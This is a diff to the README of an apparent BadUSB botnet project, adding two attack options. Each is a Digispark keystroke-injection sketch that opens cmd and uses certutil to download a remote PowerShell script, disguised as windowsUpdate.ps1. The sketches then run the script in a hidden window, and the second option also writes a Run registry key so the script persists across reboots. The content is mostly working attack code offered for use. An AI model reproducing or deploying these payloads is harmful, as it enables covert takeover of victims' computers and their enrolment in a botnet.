@@ -93,7 +93,6 @@ Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\
 #define kbd_es_es
 ```
 
-
 ## Option 2 (Backdoor)
 
 ```powershell
@@ -121,6 +120,84 @@ ENTER
 ```
 
 > Link to convert to .ino: https://malduino.com/converter/
+
+## option 3 (with cmd)
+Windows Powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. To download a file with cmd, we can use two options: ```bitsadmin``` or ```certutil.exe```. (Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions. For XP/2003 you'll need the Admin Tool Pack for windows server 2003).
+
+```cmd
+bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
+certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+```
+
+```cmd
+> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
+> powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1
+```
+
+### Digispark
+
+```c
+#define kbd_es_es
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("cmd");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+for (;;) {
+/*empty*/
+    }
+}
+```
+
+## option 4 (with cmd and backdoor)
+
+```cmd
+> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
+> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
+> reboot (?)
+```
+
+### Digispark
+
+```c
+#define kbd_es_es
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("cmd");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("reboot");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+for (;;) {
+/*empty*/
+    }
+}
+```
 
 ### Telegram Options
 
